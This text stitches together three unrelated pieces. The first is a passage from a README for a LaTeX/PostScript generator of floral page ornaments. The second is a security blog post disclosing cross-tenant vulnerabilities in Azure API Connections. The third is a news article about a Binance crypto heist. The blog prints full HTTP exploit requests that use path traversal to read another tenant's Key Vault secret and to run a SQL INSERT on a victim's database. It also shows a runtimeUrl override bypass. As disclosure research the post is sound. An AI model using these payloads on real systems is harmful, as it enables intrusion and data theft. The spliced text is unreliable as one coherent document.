-dSeed=7 -o garden.pdf postscript/florilegium.ps make postscript # the same -> build/postscript-7.pdf; SEED=12 for another garden -dSeed=N picks the garden; without it the clock picks one, so every print is new. -dAge=0 to 1 sets the season, and -dNoVisitors leaves out the butterflies, bees, snail and bird. Two pages take about 2.5 seconds. Much of the Lua maps directly: PostScript's own transformation matrix places each primitive (translate, rotate, scale), paths and Bézier curves are native, and procedures built at run time stand in for Lua's closures (a petal's half-width is a procedure handed to the outline builder). Four things don't map: Layers. The garden grows in one order but is painted back to front, so every fill and stroke is captured with pathforall into a list per layer, and the lists are played back at the end. Transparency. PostScript has none. Ghostscript provides it with -dALLOWPSTRANSPARENCY . Without that flag, or on a printer, each translucent fill is mixed with the color it is likely to land on and painted opaque. The result is flatter, but it's the same garden. Randomness. The generator is Park-Miller in 32-bit integer arithmetic, and PostScript reals are single precision, so seed 7 here is a different garden from seed 7 in LaTeX. Text. The file typesets its own two pages in Times. It knows where its headings are and where its text ends, so the copper flowers at the headings and the garden under the last line work as they do in LaTeX. It has no initials, animation, themes, mirrored pages, density or intensity, ornaments in the text, or authored composition. The file sent twice to an Epson inkjet with lp postscript/florilegium.ps , with no seed given. The computer's print system runs the program again for each job, so each print takes its seed from the clock and grows a different garden. A printer gets the opaque version, as it has no transparency. Build LuaLaTeX, one pass, about a second a page (two passes for showcase.tex , whose seasons need the page count). make # the four PDFs make seed-7 # one page from seed 7 -> build/seed-7.pdf make gallery # gallery/seeds.png + seeds.gif, inks.png, seasons.png, themes.png, dials.png (python3, Pillow, pdftoppm) make grow-6 # growth animation of seed 6 -> build/grow-6.gif + .mp4 (ffmpeg) make grow-6 EXPLAIN=1 # the same with the free discs marked -> build/grow-6-explain.* No TeX installed? Build the image once and run everything in it: docker build -t florilegium-tex tools make RUN=tools/in-docker Or paste florilegium.sty , the nine .lua files and one of the .tex files into an Overleaf project and set the compiler to LuaLaTeX. Use it in your own document: \usepackage [ grown ]{ florilegium } % or plain \usepackage{florilegium} for the authored one % options for the grown one: sections (flowers at the headings), aging (two runs), % novisitors (no butterflies, bees, snails or birds); for both: theme=geometric or theme=math, % density=0.4 (grown only), intensity=0.6 % two-sided? nothing to set: the garden grows in the wider side margin \definecolor {ink}{HTML}{5B2A1F} % optional: the hue of the whole palette (this is sepia) \definecolor {accent}{HTML}{B4662F} % optional: the copper of the hairlines ... \florilegiuminitial [4]{T}his paragraph starts with a decorated T. ... a flower in the margin beside this line \florilegiumbloom ... \florilegiumage {0.8} % grown only: autumn from here on \florilegiumtheme {geometric} % another theme, from the page this stands on \florilegiumornament {leaf} % one leaf in the text, the size of a letter \florilegiumtextend % grown only: at the very end of the text A fixed seed instead of the page number: lualatex "\def\florilegiumseed{7}\input{florilegium-grow.tex}" . Any primitive can be drawn on its own inside a TikZ picture, under the current scope's shift, rotation and scale: \begin { tikzpicture } \begin { scope }[shift={(2,2)},rotate=20] \florilegiumdraw {flower}{1.3} \end { scope } \begin { scope }[shift={(5,0)}] \florilegiumdraw {leaf}{3.0, {depth=0.6}} \end { scope } \begin { scope }[shift={(8,1)}] \florilegiumdraw {ghost}{"lily", {s=1.4}} \end { scope } \begin { scope }[shift={(11,1)}] \florilegiumdraw {butterfly}{1.5} \end { scope } \end { tikzpicture } With a theme, its primitives can be drawn by name too: \florilegiumdraw{crystal}{1.0} under theme=geometric (see specimen-geometric.tex ), \florilegiumdraw{knot}{1.2} under theme=math . How it works Drawing ( ink.lua ). All geometry is computed in Lua and written as PDF path operators into one literal node per page; TeX does no arithmetic. Primitives are drawn in a local frame under an affine transform, which is read from TikZ when a primitive is called inside a scope. Colors come from a tone ramp derived from the one document color ink : navy to mist at the hue of ink , interpolated in OKLCH so the light end stays blue instead of turning gray. Tapered strokes are two offset Béziers, not sampled ribbons. Primitives ( flora.lua ). Painted in the order a watercolorist would: a flat wash, darker blotches multiplied over it, pigment pooling at the edges, streaks lifted out in white, a few fine veins, and almost no outlines. Broad petals and flowers, star lilies seen at a tilt, blossoms and florets, buds and bellflowers; lobed and entire leaves; forget-me-not cymes that curl like a scorpion's tail, branching sprigs, umbels, tendrils, seed heads; butterflies, bees, snails and a bird; copper sparkles, rosettes and the ivy-leaf fleuron whose stem becomes the head rule. Any of them can be painted as a pale ghost. Authored composition ( authored.lua ). A plant grows from a root in the bottom-left corner: three stems through hand-picked control points, a fourth along the bottom of the page as the footer, leaves at chosen fractions of the stems, and every other motif on a branch that leaves its stem tangentially and arrives along the motif's axis — so every flower can be traced back to the root. Grown composition ( grow.lua ), in the spirit of Wong, Zongker & Salesin, Computer-Generated Floral Ornament (SIGGRAPH 1998). The stems sway up the column as smooth noise of their height; leaves are hung at their nodes where there is room. Then, repeatedly: take the largest free disc within reach of a stem, choose a motif that fits it, and grow a branch to it from the nearest stem point; the branch becomes a stem in turn. Big holes are taken first, so flowers and lilies land early, sprays and leaves fill the middle, and the loop ends by tucking leaflets, buds and florets onto the stems. The end of the text is measured with \pagetotal in the same pass, so a short last page grows branches into the space below it with one compilation. Reading the page ( florilegium.lua ). A heading or \florilegiumbloom leaves an invisible marker node in the text. When the page is shipped out, its box is walked node by node, adding up heights, depths and the glue as it was set, to find each marker's height on the page; the garden then gives those lines their flowers before any leaf is hung. An age reweights the motifs: buds and sprays of buds in spring, seed heads in autumn, when some leaves are painted with a ramp built from the accent instead of the ink. Initials ( initial.lua ). The letter's outline comes from luaotfload's OpenType reader as Bézier segments. Flattened into polygons, it gives an even-odd inside test, and a grid of distances to the letter and the frame finds the largest gaps for the flowers. The vine is a Catmull-Rom curve across the tile; where it crosses the letter it goes over and under in turn, and the strands that go over are drawn again, clipped to the letter, with a thin halo of paper. Procedural ≠ random. The seed is derived from the page number, so page n always gets garden n . Reproducibility is what makes the document stable enough to typeset. See CLAUDE.md for a handoff-style map of the code, the tunables, and ideas not yet done. Credits The Reddit post that asked the question (see Origin ). The growth loop follows Wong, Zongker & Salesin, Computer-Generated Floral Ornament (SIGGRAPH 1998). The tone ramp is computed in Oklab , Björn Ottosson's perceptual color space; the conversion matrices in ink.lua are his, released into the public domain. The random numbers come from mulberry32 , Tommy Ettinger's public-domain generator. \florilegiumornament , its ink and seed=random keys, and the density option answer issue #4 from rubyFeedback. The math theme's figures keep the names of the people they come from: Maurer's roses, Vogel's model of the sunflower, Temple Fay's butterfly curve, the Petersen graph, Koch's snowflake, Hilbert's curve, Lissajous figures, the gasket of Apollonius. title: Azure's Weakest Link – Five Full Cross-Tenant Compromises
body_text: Azure's Weakest Link - Five Full Cross-Tenant Compromises Azureâs Weakest Link - Five Full Cross-Tenant Compromises | Binary Security AS Home About Careers Services Penetration Testing Application Security Security Engineering Posts Contact Azure's Weakest Link - Five Full Cross-Tenant Compromises Posted by Haakon Wik Gulbrandsrud on October 02, 2026 · 18 mins read In my previous blog posts, Azureâs Weakest Link? and Azureâs Weakest Link - Full Cross-Tenant Compromise , I gave an overview of the severely insecure architecture behind API Connections in Azure, a part of Azure Logic Apps, and an instance of a full cross-tenant compromise using these inherent flaws. Now I am back with some more vulnerabilities in this system, each giving the same primitives to the attacker. In total, the vulnerabilities here netted me a cool $200,000. I also held a talk detailing this at Blue Hat Asia 2026, and when the recordings are out, I will add a link here. TL;DR API Connections allow anyone to fully compromise any other connection worldwide, giving full access to the connected backend. This includes cross-tenant compromise of Key Vaults and Azure SQL databases, as well as any other externally connected service, such as Jira or Salesforce. The only thing stopping exploitation is really the layers of input validation bolted onto the various systems, but as you will see, it is really difficult to catch all the edge cases here. Architecture If you havenât read the first parts of this series, I would recommend checking those out first, Azureâs Weakest Link? - Part 1 and Azureâs Weakest Link - Full Cross-Tenant Compromise , but if you donât care, I will go through the most important parts of the architecture first. From Microsoftâs documentation , we see a quite intriguing diagram of how the API Connection architecture is built. This basically spells out all that is needed to understand how the system operates, kudos to whoever made it! It works like this A logic app, the symbol on the bottom left, queries a shared Azure API Management instance The API Management instance first checks the swagger (OpenAPI) definition of the connector type and checks that it is a valid action A sort of key exchange happens where the input token, or key, is exchanged for the configured token for the backend service The API Management instance finishes the call with this new token to the backend instance. From this, we can surmise that if we are able to trick the API Management instance to operate on a different connection than the ones we own, we would be able to effectively use the configured token for a victimâs connection on their backend service. This service can, in effect, be anything. As you can see here , the list of backend services is effectively unbounded and includes a number of Azure services. However great the diagram is, there is one crucial omission, which we have already used to great effect in part 2 of this series. By using the ARM REST API DynamicInvoke or /extensions/proxy/ endpoints, we can directly query the APIM service through ARM. I have taken the liberty of updating the diagram to match this. Considering this, and the fact that, as a resource manager, ARM basically has full access to everything, our exploitation pathway becomes clear. We must trick the calling service into querying a different connection than ours, and thus get full control of the backend service. Caveat: It is, of course, possible for the people who set up these connections to scope their access tokens or keys so that the API Connection has minimal privileges in the backend. I would guess, however, that this is rarely done. In the case of OAuth connections, it will surely always be the token of the person who initially made the connection. And for the API key case, well, who cares enough to scope such things minimally? Microsoft doesnât, at least. Initial Exploitation The first cross-tenant exploitation I achieved in API Connections, and in fact in Azure as a whole, has already been described in part 2. As a recap, here is an example payload using the DynamicInvoke endpoint of my own connection to read the Key Vault of a different tenant. POST /subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/token-storer/providers/Microsoft.Web/connections/custom2/DynamicInvoke?api-version=2018-07-01-preview HTTP / 2 Host : management.azure.com Authorization : Bearer <token> Content-Type : application/json Content-Length : 147 { "request" :{ "method" : "get" , "path" : "path/%2e%2e/%2e%2e/%2e%2e/%2e%2e/apim/keyvault/fd8d0f4f4069495991ccb4974f96a1ed/secrets/victimsecret/value" }, } HTTP/2 200 OK Cache-Control: no-cache Pragma: no-cache Content-Length: 1329 { "response": { "statusCode": "OK", "body": { "value": "dontreadme", "name": "victimsecret", "version": "7914d45aa60342809fb8cc12dc68b10e", "contentType": null, "isEnabled": true, "createdTime": "2025-04-04T05:38:26Z", "lastUpdatedTime": "2025-04-04T05:38:26Z", "validityStartTime": null, "validityEndTime": null }, "headers": { <Headers> } } } As you can see, itâs a pretty clear path traversal vulnerability. This implies what we already assumed: When the request fires from ARM to the APIM instance, it has rights to all connections, regardless of what it operates on. Further exploitation A couple of weeks after I reported this vulnerability, it got marked as fixed, and when I tried it again, the following error message greeted me: Now, I considered whether or not this was a sufficient fix. It seemed to restrict the paths allowed, rather than the underlying token issue, so I guessed there would be ways around it. An interesting little fact about the ARM API is that, in some cases, it might not be as much of a black box as you assume. The relevant code can sometimes be found within the resource types themselves. I do not know whether this code actually executes on these machines or is merely included as an artifact, but it is a gold mine of interesting information. So, I created a Standard Logic App, which provides a fully dedicated host, SSHed into it, and extracted the code. Lo and behold, look what I found: Can you see the fix they implemented? What was even more interesting here actually was something I found, and was not really even looking for. When searching for the actual DynamicInvoke code, what greeted me was not actually just this one public function, but four: These functions are completely undocumented, and I could find no reference to them anywhere. However, they were reachable and located along the same path. So, for instance, to hit DynamicList here, simply change dynamicInvoke in your URI to DynamicList . Knowing that the slap-dash blacklisting fix that they implemented only applied to DynamicInvoke , I assumed that these would all be vulnerable in the same way if they had the same functionality. Without boring you too much with the required arguments and return values here, the exploitation method is really quite the same, although the payload is a bit more involved. For DynamicList , you need to specify each path parameter on its own and do a bit of work to get a result, but the same logic applies. To achieve, for instance, a cross-tenant write on a victimâs SQL server through their connection, a payload like this works: POST /subscriptions/162fc6db-03cd-4fe8-ab44-dc0a947e74af/resourceGroups/api-connection/providers/Microsoft.Web/connections/custom_validator/DynamicList?api-version=2018-07-01-preview&_=1765372176638 HTTP / 2 Host : management.azure.com Authorization : Bearer <token> Content-Length : 524 Content-Type : application/json { "dynamicInvocationDefinition" : { "operationID" : "nine" , "parameters" : { "one" : { "value" : ".." }, "two" : { "value" : ".." }, "three" : { "value" : "sql" }, "four" : { "value" : "88d28f5ff7b642cfb91df184938d074c" }, "five" : { "value" : "v2" }, "six" : { "value" : "datasets" }, "seven" : { "value" : "victimservice.database.windows.net,VictimDatabase" }, "eigth" : { "value" : "query" }, "nine" : { "value" : "sql" }, "query" : { "value" : { "query" : "Insert INTO MySecrets VALUES ('NewEvilSecrets', 3)" } } }, "ItemsPath" : "ResultSets/Table1" , "ItemValuePath" : "secrets" , "ItemTitlePath" : "value" } } You can quite easily see that the first parameters here execute the path traversal and then perform an arbitrary SQL query on the database. I reported only the DynamicList case first, in the hope that they would perform a similar fix to DynamicInvoke and I would get to report on the other two as well. Sadly, their fix involved simply blocking all these endpoints. No other mitigations seem to be in place, however, so if these endpoints ever become accessible again, I would assume they would be vulnerable. Further exploitation Messing around with paths in these dynamic calls seemed to have reached its conclusion: I couldnât get past the path limitations on DynamicInvoke , and all the other endpoints were blocked. What I needed was a different way in. As I was trying to sleep one day, it occurred to me that I had overlooked using the Logic Apps themselves. I realized that there was, in fact, a significant difference between the Consumption and Standard Logic Apps connection-creation flows. The most glaring difference is that Consumption Logic Apps, where your workflow is co-located with a bunch of others, create a Version 1 connection, while the dedicated-host Standard Logic Apps create a Version 2 connection. The following diagrams make a more subtle difference between the flows clear: Do you see the difference? Obviously, when itâs spelled out like that, itâs pretty clear what the point is. Using a Standard Logic App, after we have created the resource and added whatever authentication to the backend server we need, we authorize that specific logic app to access it using its managed identity. However, when we have a Consumption Logic App, we donât have any such identity to authorize because we donât control it. This perhaps makes some sense: we canât authorize it, so we donât. I realized that this must imply that every Consumption Logic App has implicit access to every Version 1 API Connection; the only thing stopping us from exploiting this must be some sort of input validation. The classic view of a Logic App workflow is quite restrictive in its input, but there are both the API endpoints, and the Code view in the GUI that allow us to play around a bit more with the inputs. This allows us to see the inputs in more detail, edit them, and even add more. The obvious trick of changing the referenced connector to a victimâs connection fails, as the runtime performs extensive validation that you own the connection. We have the codebase, though, so we can try to find all the valid parameters. It did not take much searching for me to discover the host.api.RuntimeUrl parameter. I canât quite get my head around why this parameter is included, nor why itâs still accepted to this day, but it works in the way you would expect. After performing a series of validations on the connection referenced in host.connection , you can specify that it should use something completely different instead of the runtimeUrl baked into that connection. As long as the host ends with azure-apihub.net , it will also include the required Authorization header. What happens when this workflow is run then? The keen-eyed reader might notice that the runtimeUrl used in the exploit is not just the connectionId . This is because some extra elements get added to the URI, but it is of no consequence to us; the exploit works fine. Manna from the heavens I, of course, reported this to Microsoft again, and they spent some time working up a fix. When it finally came through, the exploit returned an error message: The host API runtime URL is not valid for the API connection '/subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/token-storer/providers/Microsoft.Web/connections/keyvault-1'. The runtime URL path must match the expected API endpoint 'https://logic-apis-norwayeast.azure-apihub.net/apim/keyvault/cbfb0f4313144117a7440368902bb871?' for the referenced connection. Either omit the 'host.api' input property, or correct the runtime URL to match the API associated with the connection. Except for the excessive length of this message, it seems like quite a suitable fix. The runtime URL must exactly match what is expected; otherwise, no dice. Apart from just removing the parameter altogether, itâs quite sane. Unless, of course, it checks that value at the wrong time: This works again, with the same result. Whatâs going on here is that the validation happens before the path is normalized, so the runtime thinks the URI is pointing to my referenced connection, but the APIM instance sees it differently. And just like that, I got another critical vulnerability. The fun does not stop there. When Microsoft managed to scrape together a fix for this path traversal, a surprising thing happened. The original RuntimeUrl path was no longer validated, and as a result, you could perform that attack again. I would include some pictures, but they would be the same pictures as above, so you can just imagine them. Reporting and rewards Altogether, API Connections have netted me five critical elevation-of-privilege vulnerabilities in Azure, which is perhaps more than expected. All vulnerabilities reported here were fixed within a reasonable time after I submitted the reports, and while there were some disagreements with MSRC along the way, overall, I am quite happy with the results. title: The $6.3B Binance hack was pulled off in just 20 minutes
body_text: The $6.3 Billion Binance Hack Was Pulled Off in Just 20 Minutes | WIRED Skip to main content THE WIRED APP IS HERE DOWNLOAD NOW » Menu WIRED SECURITY POLITICS THE BIG STORY BUSINESS SCIENCE CULTURE REVIEWS Menu WIRED Account Account Newsletters Security Politics The Big Story Business Science Culture Reviews Chevron More Expand The Big Interview Magazine Events WIRED Insider WIRED Consulting Newsletters Podcasts Video Livestreams WIRED Store Search Search Matt Burgess Security Oct 30, 2026 7:36 AM The $6.3 Billion Binance Hack Was Pulled Off in Just 20 Minutes Multiple crypto-tracing firms say notorious North Korean hackers TraderTraitor may be behind the largest digital heist in history—with billions of crypto likely gone for good. Photo-Illustration: Wired Staff; Getty Images Comment Loader Save Story Save this story Comment Loader Save Story Save this story Cryptocurrency firms and investigators are racing to freeze and track down billions of dollars of stolen digital cash following what appears to be the largest crypto heist of all time. On Thursday, starting at around 4pm ET, hackers started quickly siphoning around $6.3 billion in cryptocurrencies, spread across multiple blockchains, from wallets belonging to crypto exchange Binance . Following the theft, Binance almost immediately suspended all deposits and withdrawals from its services as part of its investigation into the hack and says it is working to identify who was behind the breach. The company, along with other crypto firms, says it has so far been able to freeze around half of the stolen funds—essentially stopping hackers moving the money further or trying to cash it out. Much of the remaining crypto may not be possible to freeze, however. Three crypto tracing firms have been quick to link the attack potentially to North Korean hackers. “We think North Korea is likely responsible,” Tom Robinson, chief scientist and cofounder of Elliptic, tells WIRED. “If North Korea is behind it, this one theft would almost double everything the regime has stolen in crypto to date.” The majority of the stolen crypto was taken in a period of around 20 minutes on October 29, according to analysis by crypto tracing firm TRM Labs. Wallets belonging to Binance across at least ten blockchains—including Ethereum, Bitcoin, Tron and Solana—were drained and sent to multiple addresses controlled by a single attacker, according to TRM’s analysis . “Preparation began at least 36 hours before the theft,” TRM says in a blog post. The company says one of the attacker’s wallets received three small withdrawals during a test period, before later expanding the operations. “Early on October 29, the operator deployed a first piece of code for the attack and tested it on two wallets,” TRM says. “Later that day, it rehearsed the final version on a third wallet, then routed the test funds back to itself. Four hours after that rehearsal, the same code was installed on a Binance hot wallet.” Hot wallets are cryptocurrency wallets that are internet connected and allow crypto exchanges to handle customer withdrawals. Analysts say the funds were drained from hot wallets across the impacted blockchains. The tactics used in the hack appear to mimic previous methods used by an elite subset of North Korean hackers, known by the name TraderTraitor . Crypto tracing firms TRM Labs and Chainalysis both say they believe TraderTraitor may be behind the attack, while Robinson says Elliptic hasn’t specifically tied it to the group but sees overlaps in the activity. Neither Binance nor law enforcement officials have named any suspected links between the attack and North Korean hackers. Over recent years, North Korean hackers have repeatedly targeted cryptocurrency firms and stolen hundreds of millions in crypto heists. Multiple North Korean hacking groups can target companies in the sector, but TraderTraitor have become specialists, pulling off infrequent but high profile attacks. Within North Korea’s sprawling hacking operations —often designed to earn money for the highly sanctioned and repressive regime—TraderTraitor has stood out in recent years for its sophistication and targeting of crypto and decentralized finance companies. Last year, the FBI named TraderTraitor as being responsible for the $1.5 billion hack against crypto exchange Bybit. Binance did not answer WIRED’s questions about whether it believes North Korean hackers are behind the colossal heist, pointing towards a statement saying it will cover all losses from the hack and is working with law enforcement officials to identify who is responsible. “Our initial investigation suggested that the security incident may have involved a compromised laptop, however, our subsequent investigation has uncovered additional points of breach,” the company says in a statement. “This was a complex attack, and we are doing all we can in coordination with law enforcement to resolve it.” “These folks in particular are somewhat artists in terms of getting into these distributed finance organizations,” Rafe Pilling, a senior director of threat intelligence at security company Sophos, tells WIRED. “TraderTraitor seems to focus on these larger operations. In the past, they’ve developed their own fake applications and tried to use those to get inside organizations.” TRM and Chainalysis have initially linked the attack to TraderTraitor and say the determinations are based on their analysis of both on-chain and off-chain activity. “​​The strongest evidence emerged when Chainalysis investigators observed, in real time, funds stolen from Binance commingling with funds stolen in last month’s Bitget exploit , which had been attributed to North Korean actors,” a research blog from Chainalysis says. “Binance says the attack began with a compromised engineer’s laptop. Targeting crypto company staff is a TraderTraitor hallmark,” Elliptic’s Robinson says. “The attacker funded their wallet through Tornado Cash and rehearsed the attack in advance, as in Bybit.” While around $3 billion of cryptocurrency was initially frozen in the aftermath of the attack, it is likely those behind it could still potentially take away huge sums as not all of the stolen crypto can be frozen. Research from Chainalysis says the company is seeing money “laundering patterns we have not seen before” and that thousands of transactions being quickly processed indicates that they are using “automation to obscure the trail of funds.” Elliptic’s Robinson says that around $2.8 billion, or around 44 percent of the total amount stolen, has been frozen by crypto companies and exchanges so far, with almost all of this being stablecoins. “The remaining $3.3 billion is mostly Bitcoin, Ether, and XRP, which no one can freeze,” Robinson says. “It can only be stopped when it reaches an exchange or other service. Some will be caught over the coming months, but I don’t expect the frozen share to rise much further.” Comments Back to top Join the discussion Comments Back to top Triangle You Might Also Like In your inbox: For life-tested picks, sign up for our Gear newsletters Airbnb hosts are furious they can no longer make guests do their chores big story: cool kids write in all lowercase —does that make you mad?
